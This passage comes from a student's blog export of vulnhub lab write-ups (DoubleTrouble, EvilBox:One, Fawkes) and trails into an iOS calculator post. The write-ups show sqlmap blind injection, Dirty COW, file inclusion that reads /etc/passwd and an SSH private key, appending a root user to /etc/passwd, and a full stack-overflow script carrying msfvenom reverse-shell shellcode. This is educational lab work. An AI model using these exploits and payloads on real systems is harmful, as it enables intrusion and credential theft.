中输入上述指令，完成提权。 切换至靶机的 root 用户主目录，发现还存在一个靶机的 .ova 文件： 使用 nc 命令将其下载到 kali，再通过 virtualBox 的文件传输功能将其传送至宿主机。 12nc -n 10.0.2.15 1234 &lt; doubletrouble.ova # 靶机nc -lp 1234 &gt; doubletrouble.ova # kali 或在靶机上开启 web 应用，然后在上对目标文件进行下载【本次使用】 0x04. SQL 盲注 对该靶机进行同样的主机发现以及端口扫描等常规操作之后，发现开放了 80 端口，浏览器访问，发现又是一个登录界面： 常规的 SQL 注入探测未发现注入点，考虑 SQL 盲注。 截获我们在该界面进行登录时的请求： 修改如下： 根据 SQL 语法，我们可以判定，如果该报文的响应在发送十秒之后到来。则说明此处存在注入点。考虑通过 sqlmap 实现盲注的自动化，并导出靶机数据库。 将该请求数据包的内容拷贝至本地的文件 sqlinject 中： 使用 sqlmap 从该文件中加载请求，并进行探测： 1sqlmap -r sqlinject -p uname,psw # 指定测试参数为uname, psw sqlmap 会自动尝试各种注入方式，根据输入结果可知 sqlmap 成功通过基于时间的盲注获取靶机数据库的信息： 查看当前用户可见的数据库： 1sqlmap -r sqlinject -p uname,psw --dbs 由于是基于时间的盲注，观察结果的输出过程可以发现，每隔一段时间确认一个字符。 查看数据库 doubletrouble 中的表： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble --tables 查看表 users 的列： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users --columns 查看表中 username 与 password 两项的内容： 1sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users -C username,password --dump 发现存在两个用户。 将其输入之前的登录界面，发现两个用户都无法登录。想到靶机开放了22端口，尝试使用上述两个用户的信息通过 SSH 登入靶机。发现用户 clapton 登入成功： 0x05. “脏牛”漏洞提权 脏牛漏洞：又叫Dirty COW（copy-on-write），存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。 漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复） 发现当前目录有存在文件 user.txt，查看内容，获取第一个 Flag： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 查看内核版本 uname -a： 发现该版本存在脏牛漏洞。 搜索其利用代码： 仓库：https://github.com/gbonacini/CVE-2016-5195 在 kali 创建 dcow.cpp 写入漏洞利用代码，并通过 web 服务将其上传至靶机： 12sudo python3 -m http.server 80 # kaliwget http://10.0.2.15/dcow.cpp # 靶机 查看仓库中的 makefile 文件，发现编译指令： 1g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil 在靶机上编译运行，发现该程序将靶机上 root 用户的密码强制更改为了 dirtyCowFun： 使用 su root，输入该密码切换至 root 身份： 切换至 root 用户的主目录，查看其目录下的文件，发现第二个 Flag： Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 三、实验结果 root： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 四、总结 访问 80 端口发现一个登录界面。爆破隐藏路径，发现 /secret/ 路径。在其目录下发现一个图片，使用 stegseek 破解其中数据，猜测是用于登录主页的邮箱和密码，使用其进行登录，发现登录成功。 浏览各个界面寻找文件上传点，上传一句话木马文件，通过该文件注入反弹 shell 脚本生成反弹 shell。 使用 awk 提权，发现另一个靶机的 .ova 文件，下载至 kali 后移动到宿主机，导入 Virual Box 后启动。 浏览器访问 80 端口，发现登录界面。通过 sqlmap 进行 sql 注入，获取用户名和密码，通过 SSH 登入。 查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第八周 vulnhub-EvilBox:One","slug":"vulnhub-EvilBoxOne","date":"2022-11-08T07:41:56.000Z","updated":"2022-11-26T07:58:11.962Z","comments":true,"path":"vulnhub-EvilBoxOne/","link":"","permalink":"http://blog.kekwy.com/vulnhub-EvilBoxOne/","excerpt":"","text":"网络攻防实战 第八次实验 邮箱：&#x6b;&#x65;&#101;&#x6b;&#107;&#x65;&#119;&#x79;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d; 2022年11月8日 靶机链接：https://vulnhub.com/entry/evilbox-one,736/ 一、实验目的取得目标靶机的 root 权限并获得两个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 隐藏路径爆破 参数名爆破 文件包含漏洞的发现以及利用 SSH 登入 私钥密码爆破 特定权限文件的发现 添加自定义用户记录 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.12 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.12 -A 访问80端口发现是一个 Apache2 Debian 的默认页面，没有对渗透有帮助的信息： 0x01. 隐藏路径爆破 首先使用 dirsearch 进行路径爆破： 找到了隐藏路径 /secret/ 和隐藏文件 robots.txt。 分别访问均没有获得有效信息。 ps：robots.txt 对 /secret/ 做进一步路径爆破： 直接使用 dirsearch 由于字典限制无法找到更多信息，此处使用 gobuster 进行爆破。 安装：apt install gobuster 安装字典：apt install seclists 渗透测试要尝试掌握多种工具 使用指定字典进行路径爆破： 1$ gobuster dir -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp 除了主页文件之外，还发现一个 PHP 文件 evil.php。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 GET 方法提供一个参数（即在 url 后添加某个参数）。 0x02. 参数名爆破使用 ffuf 工具对该参数键值对（参数名和对应的值）进行爆破： 首先期望存在命令注入漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=ls -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 命令 ls 作为参数值。 进行爆破后，为获得有效结果，爆破失败。 期望存在文件包含漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 已知存在的主页文件的路径作为参数值。 爆破成功，结果显示需要提供的参数名为 command 。 查看靶机文件验证漏洞存在： 1http://10.0.2.12/secret/evil.php?command=/etc/passwd 查看返回页面源码： 读取了靶机上的 /etc/passwd 文件，确认存在文件包含漏洞。 0x03. SSH 私钥密码爆破 通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 mowree 用户拥有登录权限，其主目录为 /home/mowree.尝试获取其被允许的 SSH 登录方式： 1$ ssh mowree@10.0.2.12 -v # debug模式 发现除了允许输入对应密码登录外还可以使用密钥登录。 通过文件包含漏洞查看靶机上该用户的私钥： 1http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa 将其保存在文件 id_rsa 中。 使用指定私钥登录靶机： 1# ssh mowree@10.0.2.12 -i id_rsa 发现需要输入私钥的密码： 考虑对其进行爆破。 如果出现报错： 这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。 修改权限为7000即可： 1$ chmod 7000 id_rsa 参考：https://blog.csdn.net/Figure_hb/article/details/90754146 将密钥文件转换为 john 可用的 hash 文件： 1# /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash 使用 john 进行爆破： 1$ john id_rsa.hash --wordlist=rockyou.txt 该字典文件可通过在 kali 上使用 locate 指令搜索得到 成功获取私钥密码 unicorn。 成功登入靶机： 0x04. 信息收集 查看当前目录下的文件，获取第一个 Flag： Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ 当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件： 1$ find / -perm -o+w -maxdepth 3 -print | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt find指令的使用：https://blog.csdn.net/m0_46674735/article/details/112390027 使用find命令按权限查找文件：https://www.iplayio.cn/post/596968725 -o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）； -maxdepth：从根目录开始搜索的最大深度为3； -print：将输出结果写入标准输出文件； grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run： 忽略以上目录下的搜索结果； &gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。 查看搜索结果，发现 /etc/passwd 文件竟然可以被其他用户写入： 进一步验证： 1$ ls /etc/passwd -al 发现我们确实具有写权限。 设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。 0x05. 自定义 root 用户 首先需要在 kali 上对我们自定义的密码进行加密。使用工具 openssl： 1$ openssl passwd 这里我输入的明文密码为 test123。 使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录： 1test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash 将该记录追加在 /etc/passwd 文件中： 1$ echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换到用户 test123： 1$ su test123 成功提权。 切换到 root 目录，发现第二个 Flag： Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM 三、实验结果 Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM root： 四、总结 根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破； 使用 dirsearch 爆破到存在 /secret/ 路径，但是继续爆破无果。换用 gobuster 进行路径爆破，最终找到一个 PHP 文件 evil.php； 直接访问返回空白页，推测其可能需要一个参数，使用 ffuf 进行参数名的爆破，最终发现存在文件包含漏洞； 通过文件包含漏洞查看文件 /etc/passwd，发现一个可以登录的用户 mowree。使用 ssh 尝试登录发现该用户还支持私钥认证登录； 通过文件包含漏洞获取靶机对应路径下的私钥，并使用 john 对私钥密码进行爆破； 成功登入靶机后，发现当前用户对 /etc/passwd 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录； 使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。 五、思路拓展 对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞） 也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 evil.php 读出： 1http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg== 通过 icyberchef 进行解码： 1234&lt;?php $filename = $_GET[&#x27;command&#x27;]; include($filename);?&gt; 成功获取到 evil.php 的源码。 尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本： 12http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz 尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第七周 vulnhub-Fawkes","slug":"vulnhub-Fawkes","date":"2022-11-02T05:21:10.000Z","updated":"2022-11-10T09:24:37.076Z","comments":true,"path":"vulnhub-Fawkes/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Fawkes/","excerpt":"","text":"网络攻防实战 第七次实验 邮箱：&#107;&#x65;&#101;&#107;&#x6b;&#101;&#x77;&#121;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d; 2022年11月2日 靶机连接：https://vulnhub.com/entry/harrypotter-fawkes,686/ 一、实验目的取得目标靶机的 root 权限并获得三个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 FTP匿名登录 edb 调试程序 栈溢出攻击 tcpdump 流量分析 sudo 漏洞提权 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.11 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 123$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.11$ sudo nmap -p21,22,80,2222,9898 -sV 10.0.2.11 -A 发现两个比较特殊的端口： 21 - ftp 服务并允许匿名登录获取文件 server_hogwarts； 9898 - 一个自定义的服务。 访问80端口并查看网页源码，发现只有一张图片，并没有其他有价值的信息： 0x01. FTP 匿名登录 查看我们端口扫描获取的信息： 说明该 FTP 服务可以使用用户名 Anonymous 无密码登入并可以查看文件 server_hogwarts。 通过 FTP 登入靶机并使用 get 指令下载上述文件： 12$ ftp 10.0.2.11ftp&gt; get server_hogwarts 查看文件类型，发现是一个 ELF 可执行文件： 1$ file server_hogwarts 给予执行权限，尝试执行： 发现什么都没有输出，但是 shell 阻塞住了并没有退出，说明该程序确实启动了。 查看后台进程： 1$ ps -aux | grep server # 显示名字包含server的所有进程 发现该程序确实创建了后台进程。 查看该进程的连接信息： 1$ ss -pantu | grep server_hogwarts 发现该进程运行在9898端口上，联想到靶机9898端口上的自定义服务，推测该程序即为靶机9898端口上所运行的服务。 使用 nc 命令监听该端口： 发现我们可以进行输入，推测存在栈溢出攻击。 0x02. 栈溢出攻击 使用 checksec 工具查看该文件开启了哪些保护机制： 安装：$ apt install checksec 1$ file server_hogwarts STACK CANARY：在初始化堆栈时在栈底插入一个随机生成的 cookie，在函数返回前调用 __stack_chk_fail 检查 cookie 有没有发生变化，若发生变化则不返回，而直接终止程序。由于缓冲区溢出攻击时往往会覆盖掉 cookie 的值，故该保护机制开启时会导致常规的溢出攻击失效，程序会直接终止而不是跳转至攻击者注入的目标地址。 NX：开启时栈中数据没有执行权限，即攻击者不能通过缓冲区溢出注入攻击代码； PIE：编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定，使程序的内存布局难以预料。 参考：checksec NX、PIE 关闭，我们可以尝试注入反弹 shell 的代码并使其被执行，从而获取反弹 shell。 STACK CANARY 被开启了，意味着注入时我们也许要针对其进行某种绕过，先不管它。 将 kali 本机上的 ALSR 安全机制关闭，该技术会导致地址空间随机化，不便于调试： 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 使用 edb 对当前程序进行调试，探测注入点： 安装：$ apt install edb-debugger 1$ sudo edb 点击 File-&gt; Attach ： 选择目标进程： 点击运行： 使用 python 生成500个“A”，并在监听窗口进行输入： 1$ python -c &quot;print(500*&#x27;A&#x27;)&quot; 触发报错且看到“0x41414141”，查看此时 EIP 寄存器的值： 发现变成了 0x41414141，而 ‘0x41’ 为 ‘A’ 的十六进制编码，说明我们输入的字符成功覆盖了函数返回地址，导致程序发生了错误跳转。 “诶？不是说这个程序开启了 STACK CANARY 保护机制，会对栈溢出做检查吗？为什么直接注入就成了？” 重新执行上述操作，并重新监听9898端口。点击单步调试： 同样输入500个A， 回到 edb 继续追踪，直到触发错误，记录此时的指令地址： 发现在追踪的过程中没有调用 __stack_chk_fail 函数检查 cookie 的正确性。通过 objdump 查看其反汇编代码进一步确认，发现原来 __stack_chk_fail 只在一部分函数返回前被调用了，而在注入点所在的函数中未被调用，因此我们可以正常进行注入。 综上，Canary found 仅代表程序中存在检查机制，而不一定在所有的ret 语句前都做了检查。在进行渗透测试时应先尝试注入，不要被一些未验证的细节限制了思路。 使用 msf-pattern 工具进行溢出点在输入字符串中位置的探测： 1$ msf-pattern_create -l 500 # 生成长度为500的模式字符串 重新程序并重新开始调试，将生成的模式字符串作为输入： 提示我们此时 EIP 中的值为 0x64413764，即我们输入的字符串中编码为“\\x64\\x41\\x37\\x64”的字串进入了 EIP 中。查找该段编码对应的字符串在模式字符串中的偏移量： 1$ msf-pattern_offset -l 500 -q 64413764 也就是说从模式字符串中的第113个字符串开始造成了栈溢出。 使用 python 生成一段自定义字符串进行验证： 1$ python -c &quot;print(112*&#x27;A&#x27; + &#x27;BBBB&#x27; + 100*&#x27;C&#x27;)&quot; 将生成的字符串输入后，查看 EIP 和栈中的值： 发现第113、114、115、116个字符（“BBBB”）恰好进入 EIP，而其后的字符保留在栈中。 设想将反弹 shell 代码注入栈中，而使程序跳转到栈中执行（jmp esp），即可令靶机上的程序执行反弹 shell 代码生成反弹 shell。 寻找原程序中的 jmp esp 指令，打开 edb 的 Opcode Search： 选择一个可执行段，然后选择搜索 ESP -&gt; EIP： 找到 jmp esp 指令并记录其地址（0x08049d55）： 构造注入字符串： 1$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b &quot;\\x00&quot; -f py LHOST：改为 kali 的 IP； LPORT：改为监听反弹 shell 的端口号； -b &quot;\\x00&quot;：过滤坏字符（’\\0’），避免输入提前终止。 编写注入脚本： 123456789101112131415161718import struct, socketbuf = b&quot;&quot;buf += b&quot;\\xd9\\xec\\xbe\\xe7\\x1d\\x4c\\x47\\xd9\\x74\\x24\\xf4\\x5f&quot;buf += b&quot;\\x29\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x08&quot;buf += b&quot;\\xe1\\xae\\xb2\\xe7\\xc1\\xd8\\xde\\x54\\xb5\\x75\\x4b\\x58&quot;buf += b&quot;\\xb0\\x9b\\x3b\\x3a\\x0f\\xdb\\xaf\\x9b\\x3f\\xe3\\x02\\x9b&quot;buf += b&quot;\\x09\\x65\\x64\\xf3\\x83\\x95\\x94\\x0c\\xfc\\x97\\x98\\x03&quot;buf += b&quot;\\xa0\\x1e\\x79\\x93\\x3e\\x71\\x2b\\x80\\x0d\\x72\\x42\\xc7&quot;buf += b&quot;\\xbf\\xf5\\x06\\x6f\\x2e\\xd9\\xd5\\x07\\xc6\\x0a\\x35\\xb5&quot;buf += b&quot;\\x7f\\xdc\\xaa\\x6b\\xd3\\x57\\xcd\\x3b\\xd8\\xaa\\x8e&quot;payload = 112 * b&#x27;A&#x27; + struct.pack(&#x27;I&#x27;,0x08049d55) + 32 * b&#x27;\\x90&#x27; + bufs=socket.socket()s.connect((&#x27;10.0.2.11&#x27;,9898))s.send((payload))s.close() 关于上述脚本，我们在栈溢出跳转地址和攻击代码之间加入了一长串空指令 nop（\\x90）。至于为什么一定要加上这一段，我们先看看运行注入代码时发生了什么。 在本地调试时，上述脚本中 connect 的 IP 参数要更改为 127.0.0.1 程序成功跳转到 jmp esp 指令时，观察栈中数据，发现从 08049d55 （我们注入的 jmp esp 指令地址）之后紧接着就是我们加入的32个 \\x90。 接着往下看，当程序运行到 fnstenv [esp - 0xc] 指令时，栈中数据发生了变化，部分空指令被新数据覆盖： 注入代码中存在指令修改了栈顶数据，若不加空指令，我们的注入代码本身就处于栈顶，则会在执行过程中将自身的代码覆盖掉。添加空指令之后，EIP 会沿着空指令一直增长到真正的注入代码，而 ESP 不变，使 EIP 与 ESP 拉开一定的距离，一定程度上保证注入在栈中的代码不会被修改。 故在注入时加入一段空指令可以提高程序稳定性，一般加入的空指令数为4的倍数。 监听 4444 端口，执行上述脚本，获取反弹 shell： 0x03. 信息收集 发现当前用户的主目录下存在隐藏文件： 查看该文件内容： HarrYp0tter@Hogwarts123 疑似某个密码，联想此前靶机上开放的 ssh 端口，尝试通过 ssh 登录靶机。 首先通过22端口登录，发现登录失败；转而通过2222端口登录，发现登录成功： 查看用户权限： 1$ sudo -l 发现当前用户可以不使用密码通过 sudo 执行所有命令。 使用 sudo -i 指令直接提权，并发现 root 账号主目录下存在两个文件： 查看当前环境 IP： 根据 lab2 的经验，我们进入的可能是一个 docker 容器而非靶机本身。 查看此前发现的两个文件： horcrux1.txt：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} note.txt： Hello Admin!! We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user. 第一个文件为我们发现的第一个 Flag，第二个文件为一些提示，提示我们需要监听靶机 FTP 服务的流量，即靶机21端口的流量。 0x04. tcpdump 流量分析 使用 tcpdump 命令监听靶机21端口： 1$ tcpdump -i eth0 port 21 等待片刻后发现输出了一些流量记录： 发现其握手信息中包含用户名和密码。 USER：neville PASS：bL!Bsg3k 尝试使用上述用户名和密码通过靶机的22端口登入靶机： 成功登录后，通过 IP 信息发现此时环境为真正的靶机。 查看当前路径下的文件，获取第二个 Flag： horcrux2.txt：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} 0x05. sudo 漏洞提权 查看内核与 sudo 版本信息： 上网搜索相关的漏洞信息，最终发现针对当前版本 sudo 的一个漏洞及其利用代码： CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) 利用代码：https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py 将此处 sudo 的路径更改为靶机上 sudo 的路径： 在 kali 上开启 web 应用，将该文件上传至靶机运行： 成功提权！ 前往靶机的 /root/ 路径，发现第三个 Flag： 三、实验结果 Flag1：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} Flag2：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} Flag3： root 权限： 四、总结 从端口服务信息中得知靶机 FTP 服务允许匿名登录，尝试匿名登录，通过 get 指令下载文件server_hogwarts，发现是一个可执行文件； 试运行该程序，推测该程序与靶机 9898 端口所运行服务的程序相同； 使用 edb 对该程序进行调试，发现栈溢出攻击注入点，并编写注入脚本，向靶机 9898 端口服务注入反弹 shell 代码； 成功获取反弹 shell，在当前用户主目录的隐藏文件中发现可用于 ssh 登录的密码； 使用 ssh 通过靶机 2222端口登录后，发现位于一个容器中，且当前用户可以直接使用 sudo -i 进行提权。在当前容器 root 用户的主目录中发现第一个 Flag； 使用 tcpdump 监听容器 21 端口的流量，发现 FTP 的握手过程包含了用户名和密码，猜测可以用来通过 ssh 登入靶机。尝试后成功通过22端口进入靶机； 在靶机当前用户的主目录下发现第二个 Flag； 查看发行版本以及 sudo 版本，上网查找相关漏洞，最终找到可用的漏洞利用代码。简单修改后，从 kali 上传靶机，在靶机执行后成功获取 root 权限。 在靶机 root 用户的主目录下，发现最后一个 Flag。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【iOS开发】iw01 科学计算器","slug":"iw1-calculator","date":"2022-10-19T08:01:44.000Z","updated":"2022-11-10T11:21:33.769Z","comments":true,"path":"iw1-calculator/","link":"","permalink":"http://blog.kekwy.com/iw1-calculator/","excerpt":"","text":"iOS assignment 1: Calculator App. 姓名：可弟WZ Kekwy 邮箱：&#107;&#x65;&#101;&#107;&#x6b;&#101;&#x77;&#121;&#64;&#x71;&#113;&#46;&#99;&#111;&#x6d; 用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。 项目仓库：https://github.com/Kekwy/iwork1-Calculator 一、界面设计 静态布局 0x0. StackView大体分为上下两部分，上方为计算器的显示区域，下方为按键区域。 0x00. 主要约束1234Stack View.top = Safe Area.topStack View.leading = Safe Area.leadingSafe Area.bottom = Stack View.bottomSafe Area.trailing = Stack View.trailing 使当前控件大小与父控件大小一致，即填充满父控件。 0x01. 显示区域（View1） View：为该区域提供指定的背景色。 Stack View：管理两个主要的UILabel。 Exp Label：显示表达式； Res Label：显示表达式的运算结果； 主要约束：纵向填充，左右边缘与 View 始终存在10的间隔。 0x02. 按键区域（View2） VIew：为按键区域提供指定的背景色。 Stack View：管理附加按键区与常规按键区。 主要约束：将按键区的高设置为屏幕高的70%：View.height = 0.7 × height 0x020. 常规按键区 前四行按钮： 填充策略为 Fill Equally； 每行四个按钮由一个 Stack View 管理，填充策略同样为 Fill Equally； 通过约束将其高度设置为整个按键区高度的66%。 后两行按钮： 包含两个 Stack View。位于左侧的 Stack View 管理左侧六个按钮，排成两行，其中每行三个按钮又由一个 Stack View 管理；位于右侧的 Stack View 中只有作为等于操作键的一个按钮，可使其高度约为其他按钮的两倍。 通过设置约束，将左侧 Stack View 的宽约束为整个常规按键区宽度的75%。 0x021. 附加按键区 在切换为科学计算器（设备横屏）时自动显示 与常规按键区类似，每行三个按钮由一个 Stack View 管理，该部分所有 Stack View 的填充方式均为 Fill Equally。 设置约束，将管理整个附加按键区的 Stack View 的宽设置为整个按键区宽的3&#x2F;7。 0x022. 按钮细节通过设置按钮属性 layer.cornerRadius 设置按钮圆角的弧度。竖屏状态设置为20，横屏状态设置为40. 0x1. D&#x2F;R Show Label 用于显示当前的计算模式是弧度制（Rad）还是角度制（Deg）。横屏模式下显示于显示区域的左上角（通过约束实现），竖屏模式自动隐藏，可通过相关功能按键进行切换。 二、功能实现0x0. 基础功能0x00. 用户输入处理用户每次点击按钮时，计算器会执行其运行逻辑。对于非功能按钮，用户输入会在 ViewController 中被追加在当前表达式之后，然后整个表达式会被传入 Calculator 进行解析。 若用户点击功能性按钮，将在 ViewController 中调用相应的函数进行处理。 0x01. 主要运算逻辑 良好的支持多优先级操作符 使用中缀表达式转后缀表达式的计算思路，参考《数据结构》。为每个操作符设置栈中优先级和栈外优先级，天然的支持多优先级运算，即良好的支持了科学计算器中出现的多个复杂操作符。 12345678910111213let isp = [&quot;#&quot;: 0, &quot;(&quot;: 1, &quot;×&quot;: 5, &quot;÷&quot;: 5, ... ] let icp = [&quot;#&quot;: 0, &quot;(&quot;: 10, &quot;×&quot;: 4, &quot;÷&quot;: 4, ... ] 同时设置两个栈结构，一个用于保存操作数，另一个用于保存操作符，当有操作符退栈时，根据其运算规则从操作数栈中退出若干操作数，进行运算后将结果压入操作数栈。 12345678910111213141516171819private func calSubExp(opt: String) -&gt; Bool&#123; ... switch opt &#123; case &quot;×&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num1 * num2) case &quot;÷&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num2 / num1) case &quot;%&quot;: ... 0x02. memery 操作主要处理 memery 中出错和 memery 为空的情况： 1234567891011121314public func memeryRead() -&gt; String &#123; if empty &#123; return &quot; &quot; &#125; else if isError &#123; return &quot;ERROR&quot; &#125; return String(memery)&#125;public func memeryClear() &#123; memery = 0.0 empty = true isError = false&#125; 0x03. 角度制与弧度制的切换计算三角函数时，根据当前计算器的模式对操作数进行转换（浮点数精度可能导致误差）： 123if !isRad &#123; // 表示处于角度制模式 tmp = 360 * tmp / (2 * acos(-1.0))&#125; 0x04. 按钮功能切换（函数与反函数之间的互换）当使用者点击 inv 按钮时，会更改部分按钮的 title。被更改 title 的按钮被点击时，在根据新的 title 在 buttonTouched 中执行对应的分支。再次点击 inv 会复原这些按钮之前的 title，即实现按钮功能的切换。 1234567891011121314151617func doInv() &#123; if isInv &#123; lnButton.setTitle(&quot;ln&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;log&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos&quot;, for: UIControl.State.normal) 